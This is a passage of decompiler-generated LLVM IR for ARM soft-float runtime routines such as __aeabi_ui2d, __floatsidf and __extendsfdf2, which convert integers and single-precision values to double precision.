  %v2_16b8c = urem i32 %v1_16b8c, 2
  %v3_16b8c = icmp ne i32 %v2_16b8c, 0
  br label %dec_label_pc_16b88._crit_edge

dec_label_pc_16b88._crit_edge:                    ; preds = %dec_label_pc_16b88, %bb
  %v1_16b90 = phi i1 [ %v3_16b8c, %bb ], [ %v2_16b88, %dec_label_pc_16b88 ]
  %v2_16b90 = zext i1 %v1_16b90 to i32
  %v3_16b90 = add i32 %v2_16b90, %v1_16b8c
  store i32 %v3_16b90, i32* %r0.global-to-local, align 4
  %v0_16b94 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b94 = load i32, i32* @r4, align 4
  %v2_16b94 = and i32 %v1_16b94, 4096
  %v3_16b94 = icmp ne i32 %v2_16b94, 0
  %v4_16b94 = mul i32 %v1_16b94, 1048576
  %v6_16b94 = add i32 %v4_16b94, %v0_16b94
  %v7_16b94 = zext i1 %v3_16b94 to i32
  %v8_16b94 = add i32 %v7_16b94, %v6_16b94
  %v1_16b98 = load i32, i32* @r5, align 4
  %v2_16b98 = or i32 %v1_16b98, %v8_16b94
  store i32 %v2_16b98, i32* %r1.global-to-local, align 4
  ret i32 %v3_16b90

dec_label_pc_16ba4:                               ; preds = %dec_label_pc_16b5c
  %v0_16ba4 = load i32, i32* @ip, align 4
  %v1_16ba4 = icmp slt i32 %v0_16ba4, 0
  %v2_16ba4 = mul i32 %v0_16ba4, 2
  store i32 %v2_16ba4, i32* @ip, align 4
  %v0_16ba8 = load i32, i32* %r0.global-to-local, align 4
  %v3_16ba8 = mul i32 %v0_16ba8, 2
  %v4_16ba8 = zext i1 %v1_16ba4 to i32
  %v5_16ba8 = or i32 %v3_16ba8, %v4_16ba8
  store i32 %v5_16ba8, i32* %r0.global-to-local, align 4
  %v9_16ba8 = icmp ule i32 %v5_16ba8, %v0_16ba8
  %v10_16ba8 = icmp ult i32 %v3_16ba8, %v0_16ba8
  %v11_16ba8 = select i1 %v1_16ba4, i1 %v9_16ba8, i1 %v10_16ba8
  %v3_16bac = mul i32 %v0_16b5c, 2
  %v4_16bac = zext i1 %v11_16ba8 to i32
  %v5_16bac = or i32 %v4_16bac, %v3_16bac
  store i32 %v5_16bac, i32* %r1.global-to-local, align 4
  %v1_16bb0 = and i32 %v3_16bac, 1048576
  %v2_16bb0 = icmp eq i32 %v1_16bb0, 0
  %v0_16bb4 = load i32, i32* @r4, align 4
  %v1_16bb4 = add i32 %v0_16bb4, -1
  store i32 %v1_16bb4, i32* @r4, align 4
  br i1 %v2_16bb0, label %bb7, label %dec_label_pc_16b88

bb7:                                              ; preds = %dec_label_pc_16ba4
  ret i32 %v5_16ba8

; uselistorder directives
  uselistorder i32 %v0_16ba8, { 1, 2, 0 }
  uselistorder i1 %v1_16ba4, { 1, 0 }
  uselistorder i32 %v1_16b8c, { 1, 0 }
  uselistorder i32 %v0_16b88, { 1, 0 }
  uselistorder i32 %v0_16b74, { 1, 0, 2 }
  uselistorder i32 %v0_16b70, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_16b88._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16b88, { 0, 2, 1 }
}

define i32 @function_16bbc() local_unnamed_addr {
dec_label_pc_16bbc:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_16bbc = load i32, i32* @r1, align 4
  %v2_16bbc = icmp eq i32 %v0_16bbc, 0
  br i1 %v2_16bbc, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_16bbc
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_16bbc
  %v1_16bc810 = load i32, i32* @r0, align 4
  store i32 %v1_16bc810, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_16c24 = phi i32 [ %v0_16bbc, %bb ], [ %v1_16bc810, %bb38 ]
  %v1_16bdc = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_16bd4 = icmp ugt i32 %v0_16c24, 65535
  br i1 %v2_16bd4, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_16bd8 = and i32 %v0_16c24, 32768
  %v3_16bd8 = icmp eq i32 %v2_16bd8, 0
  %v4_16bd8 = udiv i32 %v0_16c24, 65536
  br i1 %v3_16bd8, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_16bdc = add nsw i32 %v1_16bdc, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_16be8 = phi i32 [ %v1_16bdc, %.thread ], [ %v1_16bdc, %bb39 ], [ %v2_16bdc, %bb40 ]
  %v1_16be4 = phi i32 [ %v0_16c24, %.thread ], [ %v4_16bd8, %bb39 ], [ %v4_16bd8, %bb40 ]
  %v2_16be0 = icmp ugt i32 %v1_16be4, 255
  br i1 %v2_16be0, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_16be4 = and i32 %v1_16be4, 128
  %v3_16be4 = icmp eq i32 %v2_16be4, 0
  %v4_16be4 = udiv i32 %v1_16be4, 256
  br i1 %v3_16be4, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_16be8 = add nsw i32 %v1_16be8, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_16bf4 = phi i32 [ %v1_16be8, %.thread3 ], [ %v1_16be8, %bb41 ], [ %v2_16be8, %bb42 ]
  %v1_16bf0 = phi i32 [ %v1_16be4, %.thread3 ], [ %v4_16be4, %bb41 ], [ %v4_16be4, %bb42 ]
  %v2_16bec = icmp ugt i32 %v1_16bf0, 15
  br i1 %v2_16bec, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_16bf0 = and i32 %v1_16bf0, 8
  %v3_16bf0 = icmp eq i32 %v2_16bf0, 0
  %v4_16bf0 = udiv i32 %v1_16bf0, 16
  br i1 %v3_16bf0, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_16bf4 = add nsw i32 %v1_16bf4, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_16bfc = phi i32 [ %v1_16bf4, %.thread4 ], [ %v1_16bf4, %bb43 ], [ %v2_16bf4, %bb44 ]
  %v1_16c04 = phi i32 [ %v1_16bf0, %.thread4 ], [ %v4_16bf0, %bb43 ], [ %v4_16bf0, %bb44 ]
  %v2_16bf8 = icmp ugt i32 %v1_16c04, 3
  br i1 %v2_16bf8, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_16bfc = add i32 %v1_16bfc, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_16c00 = udiv i32 %v1_16c04, 2
  %v6_16c00 = sub i32 %v1_16bfc, %v5_16c00
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_16c04 = phi i32 [ %v6_16c00, %.thread6 ], [ %v2_16bfc, %bb45 ]
  %v4_16c04 = udiv i32 %v1_16c04, 8
  %v5_16c04 = sub i32 %v0_16c04, %v4_16c04
  %v2_16c08 = add i32 %v5_16c04, -32
  %v4_16c08 = sub i32 31, %v5_16c04
  %v5_16c08 = and i32 %v4_16c08, %v5_16c04
  %v8_16c08 = icmp eq i32 %v5_16c04, 32
  %v6_16c0c = icmp slt i32 %v5_16c04, 32
  br i1 %v6_16c0c, label %dec_label_pc_16c10, label %dec_label_pc_16c30

dec_label_pc_16c10:                               ; preds = %bb46
  %v2_16c10 = add i32 %v5_16c04, -20
  %v7_16c14 = icmp sgt i32 %v2_16c08, -12
  br i1 %v7_16c14, label %dec_label_pc_16c18, label %dec_label_pc_16c2c

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16c10
  %v1_16c1c = sub i32 32, %v5_16c04
  %v6_16c20 = shl i32 %v0_16c24, %v5_16c04
  store i32 %v6_16c20, i32* @r0, align 4
  %v6_16c24 = lshr i32 %v0_16c24, %v1_16c1c
  store i32 %v6_16c24, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16c10
  %v8_16c10 = icmp eq i32 %v2_16c10, 0
  %v4_16c10 = add i32 %v5_16c04, 2147483616
  %v5_16c10 = and i32 %v2_16c10, %v4_16c10
  br label %dec_label_pc_16c30

dec_label_pc_16c30:                               ; preds = %bb46, %dec_label_pc_16c2c
  %v1_16c3c.in = phi i32 [ %v2_16c08, %bb46 ], [ %v2_16c10, %dec_label_pc_16c2c ]
  %v6_16c3c = phi i32 [ %v2_16c08, %bb46 ], [ %v5_16c04, %dec_label_pc_16c2c ]
  %v2_16c3c.in = phi i32 [ %v5_16c08, %bb46 ], [ %v5_16c10, %dec_label_pc_16c2c ]
  %v0_16c3c = phi i1 [ %v8_16c08, %bb46 ], [ %v8_16c10, %dec_label_pc_16c2c ]
  %v1_16c3c = icmp slt i32 %v1_16c3c.in, 0
  %v2_16c3c = icmp slt i32 %v2_16c3c.in, 0
  %v3_16c30 = xor i1 %v2_16c3c, %v1_16c3c
  %v4_16c30 = or i1 %v0_16c3c, %v3_16c30
  br i1 %v4_16c30, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_16c30
  %v6_16c30 = sub i32 32, %v6_16c3c
  store i32 %v6_16c30, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16c30, %bb47
  %v6_16c34 = shl i32 %v0_16c24, %v6_16c3c
  store i32 %v6_16c34, i32* %r1.global-to-local, align 4
  br i1 %v4_16c30, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_16c38 = load i32, i32* @r0, align 4
  %v7_16c38 = load i32, i32* @ip, align 4
  %v12_16c38 = lshr i32 %v6_16c38, %v7_16c38
  %v13_16c38 = or i32 %v12_16c38, %v6_16c34
  store i32 %v13_16c38, i32* %r1.global-to-local, align 4
  %v11_16c3c = shl i32 %v6_16c38, %v6_16c3c
  store i32 %v11_16c3c, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_16c18, %bb49
  %v6_16c44 = phi i32 [ %v6_16c24, %dec_label_pc_16c18 ], [ %v13_16c38, %bb49 ], [ %v6_16c34, %bb48 ]
  %v0_16c40 = load i32, i32* @r4, align 4
  %v2_16c40 = sub i32 %v0_16c40, %v5_16c04
  store i32 %v2_16c40, i32* %r4.global-to-local, align 4
  %v4_16c40 = xor i32 %v0_16c40, %v5_16c04
  %v5_16c40 = xor i32 %v2_16c40, %v0_16c40
  %v6_16c40 = and i32 %v5_16c40, %v4_16c40
  %v7_16c40 = icmp slt i32 %v6_16c40, 0
  %v8_16c40 = icmp slt i32 %v2_16c40, 0
  %v5_16c44 = icmp slt i32 %v0_16c40, %v5_16c04
  br i1 %v5_16c44, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_16c44 = mul i32 %v2_16c40, 1048576
  %v11_16c44 = add i32 %v10_16c44, %v6_16c44
  %v7_16c48 = load i32, i32* @r5, align 4
  %v8_16c48 = or i32 %v7_16c48, %v11_16c44
  store i32 %v8_16c48, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_16c50 = xor i1 %v8_16c40, %v7_16c40
  %v4_16c50 = xor i1 %v3_16c50, true
  call void @__pseudo_cond_branch(i1 %v4_16c50, i32 %tmp33)
  %v0_16c54 = load i32, i32* %r4.global-to-local, align 4
  %v2_16c58 = sub i32 -32, %v0_16c54
  store i32 %v2_16c58, i32* %r4.global-to-local, align 4
  %v6_16c5c = icmp sgt i32 %v0_16c54, -32
  br i1 %v6_16c5c, label %dec_label_pc_16c60, label %dec_label_pc_16ca0

dec_label_pc_16c60:                               ; preds = %.thread8
  %v1_16c60 = add i32 %v2_16c58, 12
  store i32 %v1_16c60, i32* %r4.global-to-local, align 4
  %v8_16c64 = icmp sgt i32 %v1_16c60, 0
  br i1 %v8_16c64, label %dec_label_pc_16c84, label %dec_label_pc_16c68

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c60
  %v1_16c68 = add i32 %v2_16c58, 32
  %v1_16c6c = sub i32 0, %v2_16c58
  %v0_16c70 = load i32, i32* @r0, align 4
  %v6_16c70 = lshr i32 %v0_16c70, %v1_16c68
  %v1_16c74 = load i32, i32* %r1.global-to-local, align 4
  %v7_16c74 = shl i32 %v1_16c74, %v1_16c6c
  %v8_16c74 = or i32 %v7_16c74, %v6_16c70
  %v0_16c78 = load i32, i32* @r5, align 4
  %v7_16c78 = lshr i32 %v1_16c74, %v1_16c68
  %v8_16c78 = or i32 %v0_16c78, %v7_16c78
  store i32 %v8_16c78, i32* %r1.global-to-local, align 4
  %v2_16c7c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16c7c, i32* %r4.global-to-local, align 4
  ret i32 %v8_16c74

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c60
  %v1_16c84 = sub i32 0, %v2_16c58
  %v1_16c88 = add i32 %v2_16c58, 32
  %v0_16c8c = load i32, i32* @r0, align 4
  %v6_16c8c = lshr i32 %v0_16c8c, %v1_16c88
  %v1_16c90 = load i32, i32* %r1.global-to-local, align 4
  %v7_16c90 = shl i32 %v1_16c90, %v1_16c84
  %v8_16c90 = or i32 %v7_16c90, %v6_16c8c
  %v0_16c94 = load i32, i32* @r5, align 4
  store i32 %v0_16c94, i32* %r1.global-to-local, align 4
  %v2_16c98 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16c98, i32* %r4.global-to-local, align 4
  ret i32 %v8_16c90

dec_label_pc_16ca0:                               ; preds = %.thread8
  %v0_16ca0 = load i32, i32* %r1.global-to-local, align 4
  %v6_16ca0 = lshr i32 %v0_16ca0, %v2_16c58
  %v0_16ca4 = load i32, i32* @r5, align 4
  store i32 %v0_16ca4, i32* %r1.global-to-local, align 4
  %v2_16ca8 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16ca8, i32* %r4.global-to-local, align 4
  ret i32 %v6_16ca0

; uselistorder directives
  uselistorder i32 %v2_16c58, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_16c40, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16c40, { 2, 0, 1, 3 }
  uselistorder i32 %v6_16c34, { 1, 0, 2 }
  uselistorder i32 %v2_16c08, { 1, 0, 2 }
  uselistorder i32 %v5_16c04, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_16bf0, { 1, 0 }
  uselistorder i32 %v1_16bf0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16be4, { 1, 0 }
  uselistorder i32 %v1_16be4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16bd8, { 1, 0 }
  uselistorder i32 %v0_16c24, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 4, 28, 29, 1, 0, 5, 15, 16, 6, 18, 19, 7, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 2, 8, 3, 26, 27 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -4, { 10, 11, 47, 12, 48, 49, 50, 2, 13, 55, 56, 57, 58, 59, 60, 0, 1, 54, 21, 74, 75, 76, 6, 22, 23, 24, 77, 78, 79, 7, 25, 26, 27, 80, 81, 82, 8, 28, 29, 83, 20, 19, 84, 85, 86, 18, 17, 16, 15, 30, 31, 32, 33, 34, 5, 35, 3, 36, 4, 87, 14, 37, 51, 52, 53, 38, 39, 62, 63, 64, 9, 65, 66, 67, 40, 61, 68, 69, 70, 71, 72, 73, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -8, { 4, 33, 34, 5, 0, 35, 6, 7, 8, 36, 15, 16, 17, 18, 19, 20, 14, 13, 3, 12, 11, 10, 9, 21, 22, 23, 24, 25, 2, 37, 26, 27, 38, 28, 39, 32, 29, 30, 31, 1 }
  uselistorder i32 255, { 7, 8, 4, 11, 12, 3, 5, 6, 10, 0, 1, 2, 9 }
  uselistorder i32 -16, { 2, 3, 23, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 0 }
  uselistorder i32 65535, { 3, 4, 1, 0, 2, 5 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16c30, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_16cb0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_16cb0:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_16cb0 = load i32, i32* @r4, align 4
  %v2_16cb0 = icmp eq i32 %v0_16cb0, 0
  %v1_16cb4 = xor i32 %arg3, 1048576
  store i32 %v1_16cb4, i32* @r3, align 4
  br i1 %v2_16cb0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_16cb0
  %v1_16cb8 = load i32, i32* @r1, align 4
  %v2_16cb8 = xor i32 %v1_16cb8, 1048576
  store i32 %v2_16cb8, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_16cb0
  %v1_16cc0 = load i32, i32* @r5, align 4
  %v2_16cc0 = add i32 %v1_16cc0, -1
  store i32 %v2_16cc0, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_16cc4 = call i32 @function_16b08()
  store i32 %v0_16cc4, i32* %r0.global-to-local, align 4
  %v0_16cc8 = load i32, i32* @r4, align 4
  %v0_16cc8.off = add i32 %v0_16cc8, 4194303
  %tmp = icmp ult i32 %v0_16cc8.off, 2097152
  %v1_16d58 = load i32, i32* @r5, align 4
  %v1_16d58.off = add i32 %v1_16d58, 4194303
  %tmp44 = icmp ult i32 %v1_16d58.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %bb30
  %v4_16cd4 = icmp eq i32 %v1_16d58, %v0_16cc8
  br i1 %v4_16cd4, label %bb31, label %dec_label_pc_16ce0

bb31:                                             ; preds = %dec_label_pc_16cd4
  %v2_16cd8 = load i32, i32* @r2, align 4
  %v5_16cd8 = icmp eq i32 %v2_16cd8, %v0_16cc4
  br i1 %v5_16cd8, label %dec_label_pc_16cf4, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cd4, %bb31
  %v2_16ce0 = or i32 %v0_16cc8, %v0_16cc4
  %v4_16ce0 = icmp eq i32 %v2_16ce0, 0
  br i1 %v4_16ce0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_16ce0
  %v1_16ce8 = load i32, i32* @r2, align 4
  store i32 %v1_16ce8, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_16ce0, %bb32
  %v1_16cf0 = phi i32 [ %v0_16cc4, %dec_label_pc_16ce0 ], [ %v1_16ce8, %bb32 ]
  ret i32 %v1_16cf0

dec_label_pc_16cf4:                               ; preds = %bb31
  %v0_16cf4 = load i32, i32* @r1, align 4
  %v1_16cf4 = load i32, i32* @r3, align 4
  %v4_16cf4 = icmp eq i32 %v1_16cf4, %v0_16cf4
  br i1 %v4_16cf4, label %dec_label_pc_16cf4..thread8_crit_edge, label %bb33

dec_label_pc_16cf4..thread8_crit_edge:            ; preds = %dec_label_pc_16cf4
  %v0_16d04.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_16cf4
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16cf4..thread8_crit_edge, %bb33
  %v0_16d04 = phi i32 [ %v0_16d04.pre, %dec_label_pc_16cf4..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_16d04 = xor i1 %v4_16cf4, true
  call void @__pseudo_cond_branch(i1 %v2_16d04, i32 %v0_16d04)
  %v0_16d08 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_16d08, 2097152
  br i1 %tmp45, label %dec_label_pc_16d10, label %dec_label_pc_16d24

dec_label_pc_16d10:                               ; preds = %.thread8
  %v0_16d10 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d10 = icmp slt i32 %v0_16d10, 0
  %v2_16d10 = mul i32 %v0_16d10, 2
  store i32 %v2_16d10, i32* %r0.global-to-local, align 4
  %v0_16d14 = load i32, i32* @r1, align 4
  %v3_16d14 = mul i32 %v0_16d14, 2
  %v4_16d14 = zext i1 %v1_16d10 to i32
  %v5_16d14 = or i32 %v3_16d14, %v4_16d14
  %v9_16d14 = icmp ule i32 %v5_16d14, %v0_16d14
  %v10_16d14 = icmp ult i32 %v3_16d14, %v0_16d14
  %v11_16d14 = select i1 %v1_16d10, i1 %v9_16d14, i1 %v10_16d14
  br i1 %v11_16d14, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_16d10
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_16d10, %bb34
  ret i32 %v2_16d10

dec_label_pc_16d24:                               ; preds = %.thread8
  %v2_16d24 = icmp ugt i32 %v0_16d08, -4194305
  br i1 %v2_16d24, label %dec_label_pc_16d24..thread9_crit_edge, label %bb36

dec_label_pc_16d24..thread9_crit_edge:            ; preds = %dec_label_pc_16d24
  %v0_16d30.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_16d24
  %v1_16d28 = load i32, i32* @r1, align 4
  %v2_16d28 = add i32 %v1_16d28, 1048576
  store i32 %v2_16d28, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16d24..thread9_crit_edge, %bb36
  %v0_16d30 = phi i32 [ %v0_16d30.pre, %dec_label_pc_16d24..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_16d30 = xor i1 %v2_16d24, true
  call void @__pseudo_cond_branch(i1 %v2_16d30, i32 %v0_16d30)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_16d64.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_16d64.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_16d50 = load i32, i32* @r3, align 4
  %v1_16d54 = load i32, i32* @r2, align 4
  store i32 %v1_16d54, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_16d6423 = phi i32 [ %v1_16d64.pre, %.thread14 ], [ %v1_16d50, %bb37 ]
  %v1_16d60 = phi i32 [ %v0_16cc4, %.thread14 ], [ %v1_16d54, %bb37 ]
  store i32 %v1_16d60, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_16d70 = phi i32 [ %v1_16d6423, %bb38 ], [ %v1_16d64.pre, %.thread11 ]
  %v1_16d78 = phi i32 [ %v1_16d60, %bb38 ], [ %v0_16cc4, %.thread11 ]
  %v4_16d64 = mul i32 %v1_16d70, 4096
  %v5_16d64 = or i32 %v4_16d64, %v1_16d78
  %v7_16d64 = icmp eq i32 %v5_16d64, 0
  br i1 %v7_16d64, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_16d68 = load i32, i32* @r2, align 4
  %v2_16d68 = load i32, i32* @r3, align 4
  %v5_16d68 = mul i32 %v2_16d68, 4096
  %v6_16d68 = or i32 %v5_16d68, %v1_16d68
  %v8_16d68 = icmp eq i32 %v6_16d68, 0
  br i1 %v8_16d68, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_16d6c = icmp eq i32 %v2_16d68, %v1_16d70
  br i1 %v5_16d6c, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_16d78

; uselistorder directives
  uselistorder i32 %v1_16d64.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16d14, { 1, 2, 0 }
  uselistorder i32 %v2_16d10, { 1, 0 }
  uselistorder i1 %v1_16d10, { 1, 0 }
  uselistorder i32 %v0_16d08, { 1, 0 }
  uselistorder i1 %v4_16cf4, { 1, 0 }
  uselistorder i32 %v0_16cc8, { 2, 0, 1 }
  uselistorder i32 %v0_16cc4, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_16ce0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_16d7c = icmp eq i32 %arg1, 0
  br i1 %v2_16d7c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_16d84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16d7c, i32 %v0_16d84)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_16d9c = call i32 @function_16bbc()
  ret i32 %v0_16d9c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_16da0 = icmp eq i32 %arg1, 0
  br i1 %v2_16da0, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_16da8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16da0, i32 %v0_16da8)
  store i32 1074, i32* @r4, align 4
  %v1_16db8 = and i32 %arg1, -2147483648
  store i32 %v1_16db8, i32* @r5, align 4
  %v2_16db8 = icmp eq i32 %v1_16db8, 0
  br i1 %v2_16db8, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_16dbc = sub i32 0, %arg1
  store i32 %v2_16dbc, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_16dc4 = call i32 @function_16bbc()
  ret i32 %v0_16dc4

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_16dc8 = mul i32 %arg1, 2
  store i32 %v2_16dc8, i32* %r2.global-to-local, align 4
  %v4_16dc8 = icmp eq i32 %v2_16dc8, 0
  %v1_16dcc = and i32 %v2_16dc8, 4
  %v2_16dcc = icmp ne i32 %v1_16dcc, 0
  %v3_16dcc = sdiv i32 %v2_16dc8, 8
  %v3_16dd0 = zext i1 %v2_16dcc to i32
  %v6_16dd0 = zext i32 %v3_16dcc to i64
  %v7_16dd0 = sub nsw i32 33, %v3_16dcc
  %v8_16dd0 = zext i32 %v7_16dd0 to i64
  %v9_16dd0 = shl i64 %v6_16dd0, %v8_16dd0
  %v10_16dd0 = sub nsw i32 32, %v3_16dcc
  %v11_16dd0 = shl i32 %v3_16dd0, %v10_16dd0
  %v12_16dd0 = zext i32 %v11_16dd0 to i64
  %v14_16dd0 = or i64 %v12_16dd0, %v9_16dd0
  %v15_16dd0 = trunc i64 %v14_16dd0 to i32
  store i32 %v15_16dd0, i32* %r1.global-to-local, align 4
  %v3_16dd4 = mul i32 %arg1, 536870912
  store i32 %v3_16dd4, i32* @r0, align 4
  br i1 %v4_16dc8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_16dd8 = and i32 %v2_16dc8, -16777216
  store i32 %v2_16dd8, i32* @r3, align 4
  %v4_16dd8 = icmp eq i32 %v2_16dd8, 0
  br i1 %v4_16dd8, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_16ddc = icmp ugt i32 %v2_16dc8, -16777217
  br i1 %v4_16ddc, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_16de0 = xor i32 %v15_16dd0, 939524096
  store i32 %v2_16de0, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_16de4 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_16de4 = load i32, i32* @lr, align 4
